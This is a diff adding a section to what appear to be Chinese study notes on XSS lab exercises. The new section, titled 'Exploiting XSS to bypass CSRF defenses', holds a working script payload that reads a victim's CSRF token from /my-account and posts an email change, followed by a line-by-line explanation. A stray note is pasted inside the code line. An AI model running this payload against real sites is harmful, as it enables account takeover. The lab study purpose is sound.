@@ -88,4 +88,35 @@
 
 ##总结：<iframe></iframe>一个合格的卧底，可以直接嵌入一个新的网页，onload一个高级放哨靠近就触发，不论什么标签都有可能成为注入点
 
+关卡十六：Exploiting XSS to bypass CSRF defenses
+**攻击payload**:
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="([^"]+)"/)[1];\w适合纯数字
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+**原理**：1.<script></script>起手式将标签内所有内容按代码执行
+          2.var req = new XMLHttpRequest();建立请求
+          3.req.onload = handleResponse;页面加载完成后去顺手监听浏览器在干什么，拿到回复
+          4.req.open('get','/my-account',true);用get去访问我的账户
+          5.req.send();发送
+          6.function handleResponse()功能执行
+          7.var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+            this.responseText拿到返回的代码   .match()搜索   /name="csrf" value="(\w+)"/特征搜寻 [1]要第一项
+          8. var changeReq = new XMLHttpRequest();换一个新的继续
+          9.changeReq.open('post', '/my-account/change-email', true);用post访问
+          10. changeReq.send('csrf='+token+'&email=test@test.com')将之前拿到的csrf塞进去，加上自己的邮箱
+
+
+
+
+
 
